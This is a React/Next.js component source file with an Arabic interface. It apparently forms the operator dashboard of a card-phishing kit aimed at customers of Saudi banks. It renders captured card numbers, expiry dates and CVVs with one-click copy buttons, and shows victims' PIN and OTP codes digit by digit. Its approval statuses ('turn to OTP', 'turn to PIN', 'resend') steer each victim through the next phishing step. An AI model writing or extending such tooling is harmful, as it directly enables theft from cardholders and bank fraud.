"use client";

import { ReactNode, useEffect, useRef, useState } from "react";
import { toast } from "sonner";
import { useBinData } from "./bin-info";

interface DataBubbleProps {
  title: string;
  data: Record<string, any>;
  timestamp?: string | Date;
  status?: "pending" | "approved" | "rejected";
  showActions?: boolean;
  isLatest?: boolean;
  actions?: ReactNode;
  icon?: string;
  color?: "blue" | "green" | "purple" | "orange" | "pink" | "indigo" | "gray";
  layout?: "vertical" | "horizontal";
}

type CopyableCardField = "cardNumber" | "expiryDate" | "cvv";

const copyFieldLabels: Record<CopyableCardField, string> = {
  cardNumber: "رقم البطاقة",
  expiryDate: "تاريخ الانتهاء",
  cvv: "CVV",
};

const getBankLogoUrl = (bankName: string): string | null => {
  const n = (bankName || "").toLowerCase();
  if (
    n.includes("أهلي") ||
    n.includes("ahli") ||
    n.includes("snb") ||
    n.includes("national")
  )
    return "/logo-snb.png";
  if (n.includes("راجح") || n.includes("rajhi")) return "/logo-rajhi.png";
  if (n.includes("رياض") || n.includes("riyad")) return "/logo-riyad.jpg";
  if (n.includes("إنماء") || n.includes("انماء") || n.includes("alinma"))
    return "/logo-alinma.png";
  return null;
};

const getNetworkLogoUrl = (brand: string): string | null => {
  if (brand === "MADA") return "/logo-mada.png";
  if (brand === "VISA") return "/logo-visa.png";
  if (brand === "MASTERCARD") return "/logo-mastercard.png";
  return null;
};

export function DataBubble({
  title,
  data,
  timestamp,
  status,
  showActions,
  isLatest,
  actions,
  icon,
  color: _color,
  layout: _layout = "vertical",
}: DataBubbleProps) {
  void _color;
  void _layout;
  const [copiedField, setCopiedField] = useState<CopyableCardField | null>(
    null,
  );
  const copyResetTimeoutRef = useRef<number | null>(null);

  useEffect(() => {
    return () => {
      if (copyResetTimeoutRef.current)
        window.clearTimeout(copyResetTimeoutRef.current);
    };
  }, []);

  const isCopyableValue = (value: string) => {
    const t = value.trim();
    return !(!t || t.includes("•") || t.includes("*") || t === "غير محدد");
  };

  const copyWithFallback = async (value: string) => {
    const normalized = value.trim();
    if (!normalized || typeof window === "undefined") return false;
    const fallback = () => {
      const el = document.createElement("textarea");
      el.value = normalized;
      el.setAttribute("readonly", "");
      el.style.cssText = "position:fixed;top:-1000px;opacity:0";
      document.body.appendChild(el);
      el.focus();
      el.select();
      const ok = document.execCommand("copy");
      document.body.removeChild(el);
      return ok;
    };
    if (navigator.clipboard && window.isSecureContext) {
      try {
        await navigator.clipboard.writeText(normalized);
        return true;
      } catch {
        return fallback();
      }
    }
    return fallback();
  };

  const handleCopy = async (field: CopyableCardField, value: string) => {
    if (!isCopyableValue(value)) {
      toast.error("لا توجد قيمة قابلة للنسخ");
      return;
    }
    const ok = await copyWithFallback(value);
    if (!ok) {
      toast.error("تعذر نسخ القيمة");
      return;
    }
    setCopiedField(field);
    if (copyResetTimeoutRef.current)
      window.clearTimeout(copyResetTimeoutRef.current);
    copyResetTimeoutRef.current = window.setTimeout(() => {
      setCopiedField((c) => (c === field ? null : c));
    }, 1500);
    toast.success(`تم نسخ ${copyFieldLabels[field]}`);
  };

  const getStatusBadge = () => {
    if (!status) return null;
    const badges: Record<string, { text: string; className: string }> = {
      pending: {
        text: "⏳ قيد المراجعة",
        className: "bg-amber-50 text-amber-700 border-amber-200",
      },
      approved: {
        text: "✓ تم القبول",
        className: "bg-emerald-50 text-emerald-700 border-emerald-200",
      },
      rejected: {
        text: "✗ تم الرفض",
        className: "bg-red-50 text-red-600 border-red-200",
      },
      approved_with_otp: {
        text: "🔑 تحول OTP",
        className: "bg-blue-50 text-blue-700 border-blue-200",
      },
      approved_with_pin: {
        text: "🔐 تحول PIN",
        className: "bg-violet-50 text-violet-700 border-violet-200",
      },
      resend: {
        text: "🔄 إعادة إرسال",
        className: "bg-orange-50 text-orange-700 border-orange-200",
      },
      message: {
        text: "📲 في انتظار الموافقة",
        className: "bg-amber-50 text-amber-700 border-amber-200 animate-pulse",
      },
    };
    const badge = badges[status];
    if (!badge) return null;
    return (
      <span
        className={`inline-flex items-center px-2.5 py-1 rounded-lg text-xs font-semibold border ${badge.className}`}
      >
        {badge.text}
      </span>
    );
  };

  const formatTimestamp = (ts: string | Date) => {
    const d = new Date(ts);
    const mm = String(d.getMonth() + 1).padStart(2, "0");
    const dd = String(d.getDate()).padStart(2, "0");
    let h = d.getHours();
    const min = String(d.getMinutes()).padStart(2, "0");
    const ampm = h >= 12 ? "م" : "ص";
    h = h % 12 || 12;
    return `${mm}-${dd} | ${h}:${min} ${ampm}`;
  };

  const isCardData =
    title === "معلومات البطاقة" ||
    !!data["رقم البطاقة"] ||
    !!data["نوع البطاقة"];

  const rawCardNumForBin = isCardData
    ? (data["رقم البطاقة"] || "").toString()
    : "";
  const bin = useBinData(rawCardNumForBin);

  if (isCardData) {
    const rawNum = (data["رقم البطاقة"] || "").toString().replace(/\s+/g, "");
    const cardNumber = rawNum
      ? rawNum.match(/.{1,4}/g)?.join("  ") || rawNum
      : "••••  ••••  ••••  ••••";
    const rawExpiry = (data["تاريخ الانتهاء"] || "").toString().trim();
    const expiry = rawExpiry || "••/••";
    const rawCvv = (data["CVV"] || "").toString().trim();
    const cvv = rawCvv || "•••";
    const holder = data["اسم حامل البطاقة"] || "CARD HOLDER";
    const cardType = (data["نوع البطاقة"] || "CARD").toString().toUpperCase();
    const cardLevel = (data["مستوى البطاقة"] || "").toString().trim();
    const bankName = data["البنك"] || "";
    const bankCountry = data["بلد البنك"] || "";

    const typeLower = cardType.toLowerCase();
    let brand = "CARD";
    if (typeLower.includes("visa")) brand = "VISA";
    else if (typeLower.includes("master")) brand = "MASTERCARD";
    else if (typeLower.includes("mada")) brand = "MADA";
    else if (typeLower.includes("amex") || typeLower.includes("american"))
      brand = "AMEX";

    const networkLogoUrl = getNetworkLogoUrl(brand);

    return (
      <div
        className="bg-white dark:bg-slate-900 rounded-2xl overflow-hidden border border-gray-100/80 dark:border-slate-700/80"
        style={{
          fontFamily: "Cairo, Tajawal, sans-serif",
          boxShadow: "0 1px 3px rgba(0,0,0,0.04), 0 4px 16px rgba(0,0,0,0.04)",
        }}
      >
        <div className="flex items-center justify-between px-4 py-2.5 border-b border-gray-100/80 dark:border-slate-700/80 bg-gray-50/50 dark:bg-slate-800/50">
          <div className="flex items-center gap-2">
            {isLatest && (
              <span className="text-[10px] font-bold text-emerald-600 dark:text-emerald-400 bg-emerald-50 dark:bg-emerald-950/50 border border-emerald-200/80 dark:border-emerald-800 px-2 py-0.5 rounded-lg">
                الأحدث
              </span>
            )}
            {timestamp && (
              <span className="text-[11px] text-gray-400 dark:text-slate-500 font-medium">
                {formatTimestamp(timestamp)}
              </span>
            )}
          </div>
          <span className="text-sm font-bold text-gray-800 dark:text-slate-200">{title}</span>
        </div>

        <div className="p-4">
          <div
            className="relative rounded-2xl overflow-hidden"
            style={{
              aspectRatio: "1.78 / 1",
              fontSize: "16px",
              background: "linear-gradient(145deg, #0c1a3d 0%, #142047 40%, #1a2d5e 70%, #0f1d45 100%)",
              boxShadow: "0 10px 40px rgba(0,0,0,0.3), 0 2px 8px rgba(0,0,0,0.15)",
            }}
          >
            <div
              className="absolute inset-0 pointer-events-none"
              style={{
                background: "linear-gradient(135deg, rgba(255,255,255,0.08) 0%, transparent 50%)",
              }}
            />
            <div
              className="absolute inset-0 pointer-events-none opacity-30"
              style={{
                background: "radial-gradient(ellipse at 80% 20%, rgba(99,102,241,0.15) 0%, transparent 60%)",
              }}
            />

            <div className="relative h-full flex flex-col px-5 py-4">
              <div className="flex items-start justify-between">
                <div style={{ direction: "ltr", display: "flex", flexDirection: "column", gap: "4px" }}>
                  <span className="font-bold text-white/95" style={{ fontSize: "17px", letterSpacing: "0.04em" }}>
                    {bin.bankNameAr || (bankName && bankName !== "غير محدد" ? bankName.toString() : "BANK NAME")}
                  </span>
                  {(bin.data?.level || cardLevel) ? (
                    <span style={{
                      fontSize: "12px", fontWeight: 700, letterSpacing: "0.1em",
                      color: "#e8d48b", background: "rgba(232,212,139,0.12)",
                      border: "1px solid rgba(232,212,139,0.25)",
                      borderRadius: "6px", padding: "2px 8px",
                      display: "inline-block", textTransform: "uppercase",
                    }}>
                      {bin.data?.level || cardLevel}
                    </span>
                  ) : null}
                  {bin.data && (
                    <div style={{ display: "flex", gap: "5px", alignItems: "center" }}>
                      {bin.data.currency && (
                        <span style={{ fontSize: "11px", fontWeight: 700, color: "rgba(255,255,255,0.5)", letterSpacing: "0.08em", background: "rgba(255,255,255,0.08)", borderRadius: "4px", padding: "1px 6px" }}>
                          {bin.data.currency}
                        </span>
                      )}
                      {bin.data.type && (
                        <span style={{ fontSize: "11px", fontWeight: 700, color: "rgba(255,255,255,0.5)", letterSpacing: "0.08em", background: "rgba(255,255,255,0.08)", borderRadius: "4px", padding: "1px 6px" }}>
                          {bin.data.type}
                        </span>
                      )}
                    </div>
                  )}
                </div>
                <div className="flex items-center" style={{ height: "34px" }}>
                  {networkLogoUrl ? (
                    // eslint-disable-next-line @next/next/no-img-element
                    <img src={networkLogoUrl} alt={brand} className="h-9 max-w-[90px] object-contain" style={{ filter: "brightness(0) invert(1)" }} />
                  ) : brand !== "CARD" ? (
                    <span className="font-black text-white uppercase" style={{ fontSize: "16px", letterSpacing: "0.06em" }}>{brand}</span>
                  ) : null}
                </div>
              </div>

              <div className="flex items-center gap-4 mt-auto">
                <div style={{
                  width: "44px", height: "32px", borderRadius: "6px", flexShrink: 0,
                  background: "linear-gradient(135deg, #c9a227 0%, #f5d77e 40%, #c9a227 100%)",
                  display: "grid", gridTemplateColumns: "1fr 1fr", gridTemplateRows: "1fr 1fr",
                  gap: "2px", padding: "4px", boxSizing: "border-box",
                  boxShadow: "0 1px 4px rgba(0,0,0,0.2)",
                }}>
                  {[0,1,2,3].map(i => (
                    <div key={i} style={{ background: "rgba(120,80,0,0.3)", borderRadius: "2px" }} />
                  ))}
                </div>
                <button
                  type="button"
                  onClick={() => void handleCopy("cardNumber", rawNum)}
                  disabled={!isCopyableValue(rawNum)}
                  title="نسخ رقم البطاقة"
                  className="group text-left flex-1"
                >
                  <div className="font-mono font-bold text-white tracking-widest group-hover:opacity-80 transition-all duration-200" style={{ fontSize: "24px", direction: "ltr" }}>
                    {cardNumber}
                  </div>
                  <div className="text-white/30 mt-0.5 opacity-0 group-hover:opacity-100 transition-all duration-200" style={{ fontSize: "11px" }}>
                    {copiedField === "cardNumber" ? "✓ تم النسخ" : "انقر للنسخ"}
                  </div>
                </button>
              </div>

              <div className="flex items-center gap-8 mt-2" style={{ direction: "ltr" }}>
                <button
                  type="button"
                  onClick={() => void handleCopy("expiryDate", rawExpiry)}
                  disabled={!isCopyableValue(rawExpiry)}
                  title="نسخ تاريخ الانتهاء"
                  className="group text-left"
                >
                  <div className="text-white/40 mb-0.5" style={{ fontSize: "11px" }}>VALID THRU</div>
                  <div className="font-mono font-semibold text-white group-hover:opacity-80 transition-all duration-200" style={{ fontSize: "18px" }}>
                    {copiedField === "expiryDate" ? "✓" : expiry}
                  </div>
                </button>
                <button
                  type="button"
                  onClick={() => void handleCopy("cvv", rawCvv)}
                  disabled={!isCopyableValue(rawCvv)}
                  title="نسخ CVV"
                  className="group text-left"
                >
                  <div className="text-white/40 mb-0.5" style={{ fontSize: "11px" }}>CVV</div>
                  <div className="font-mono font-semibold text-white group-hover:opacity-80 transition-all duration-200" style={{ fontSize: "18px" }}>
                    {copiedField === "cvv" ? "✓" : cvv}
                  </div>
                </button>
              </div>

              <div className="flex items-end justify-between mt-3">
                <div style={{ direction: "ltr", display: "flex", flexDirection: "column", gap: "2px" }}>
                  <span className="text-white/50 font-semibold uppercase tracking-widest" style={{ fontSize: "13px" }}>
                    {cardType !== "CARD" ? cardType : ""}
                  </span>
                  {bin.data?.country?.alpha2 && (
                    <span style={{ fontSize: "11px", color: "rgba(255,255,255,0.35)", letterSpacing: "0.08em" }}>
                      {bin.countryAr || bin.data.country.country} ({bin.data.country.alpha2})
                    </span>
                  )}
                </div>
                <span className="text-white/90 font-bold" style={{ fontSize: "16px", direction: "ltr", maxWidth: "200px", textAlign: "right", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                  {holder !== "CARD HOLDER" ? holder.toString() : "CARDHOLDER NAME"}
                </span>
              </div>
            </div>
          </div>

          <div className="mt-3 flex flex-wrap gap-1.5">
            {bankName && bankName !== "غير محدد" && (
              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-lg bg-blue-50 dark:bg-blue-950/50 text-blue-600 dark:text-blue-400 border border-blue-100 dark:border-blue-800">
                {bankName}
              </span>
            )}
            {bankCountry && bankCountry !== "غير محدد" && (
              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-lg bg-indigo-50 dark:bg-indigo-950/50 text-indigo-600 dark:text-indigo-400 border border-indigo-100 dark:border-indigo-800">
                {bankCountry}
              </span>
            )}
            {cardType && cardType !== "CARD" && (
              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-lg bg-gray-50 dark:bg-slate-800 text-gray-600 dark:text-slate-300 border border-gray-200 dark:border-slate-700">
                {cardType}
              </span>
            )}
            {cardLevel && (
              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-lg bg-amber-50 dark:bg-amber-950/50 text-amber-600 dark:text-amber-400 border border-amber-100 dark:border-amber-800">
                {cardLevel}
              </span>
            )}
          </div>
        </div>

        {(status || (showActions && actions)) && (
          <div className="flex items-center justify-between gap-2 px-4 py-3 border-t border-gray-100/80 dark:border-slate-700/80 bg-gray-50/40 dark:bg-slate-800/40">
            <div>{getStatusBadge()}</div>
            {showActions && actions && <div>{actions}</div>}
          </div>
        )}
      </div>
    );
  }

  const isPinOrOtp =
    title.includes("PIN") ||
    title.includes("OTP") ||
    title.includes("رمز") ||
    title.includes("كود") ||
    title.includes("كلمة مرور");

  let digitValue = "";
  if (isPinOrOtp) {
    const entries = Object.entries(data);
    if (entries.length > 0) digitValue = entries[0][1]?.toString() || "";
  }

  return (
    <div
      className="bg-white dark:bg-slate-900 rounded-2xl overflow-hidden border border-gray-100/80 dark:border-slate-700/80"
      style={{
        fontFamily: "Cairo, Tajawal, sans-serif",
        boxShadow: "0 1px 3px rgba(0,0,0,0.04), 0 4px 16px rgba(0,0,0,0.04)",
      }}
    >
      <div className="flex items-center justify-between px-4 py-2.5 border-b border-gray-100/80 dark:border-slate-700/80 bg-gray-50/50 dark:bg-slate-800/50">
        <div className="flex items-center gap-2">
          {isLatest && (
            <span className="text-[10px] font-bold text-emerald-600 bg-emerald-50 border border-emerald-200/80 px-2 py-0.5 rounded-lg">
              الأحدث
            </span>
          )}
          {timestamp && (
            <span className="text-[11px] text-gray-400 dark:text-slate-500 font-medium">
              {formatTimestamp(timestamp)}
            </span>
          )}
        </div>
        <div className="flex items-center gap-2">
          {icon && <span className="text-base">{icon}</span>}
          <span className="text-sm font-bold text-gray-800 dark:text-slate-200">{title}</span>
        </div>
      </div>

      <div className="px-4 py-3">
        {isPinOrOtp && digitValue ? (
          <div
            className="flex justify-center gap-2 py-2"
            style={{ direction: "ltr" }}
          >
            {digitValue.split("").map((digit, i) => (
              <div
                key={i}
                className="w-10 h-12 rounded-xl bg-gradient-to-b from-gray-50 to-gray-100/80 dark:from-slate-800 dark:to-slate-700/80 border border-gray-200/80 dark:border-slate-600/80 flex items-center justify-center"
                style={{
                  boxShadow: "0 1px 3px rgba(0,0,0,0.04), inset 0 1px 0 rgba(255,255,255,0.8)",
                }}
              >
                <span className="text-xl font-extrabold text-gray-900 dark:text-white">{digit}</span>
              </div>
            ))}
          </div>
        ) : (
          <div className="divide-y divide-gray-50 dark:divide-slate-800">
            {Object.entries(data).map(([key, value]) => {
              if (value === undefined || value === null) return null;
              const str = value?.toString() || "-";
              return (
                <div
                  key={key}
                  className="flex items-start justify-between gap-4 py-2.5 text-sm"
                >
                  <span className="text-gray-400 dark:text-slate-500 shrink-0 text-xs font-medium">{key}</span>
                  <span className="text-gray-800 dark:text-slate-200 font-semibold text-right break-all text-xs">
                    {str}
                  </span>
                </div>
              );
            })}
          </div>
        )}
      </div>

      {(status || (showActions && actions)) && (
        <div className="flex items-center justify-between gap-2 px-4 py-3 border-t border-gray-100/80 dark:border-slate-700/80 bg-gray-50/40 dark:bg-slate-800/40">
          <div>{getStatusBadge()}</div>
          {showActions && actions && <div>{actions}</div>}
        </div>
      )}
    </div>
  );
}
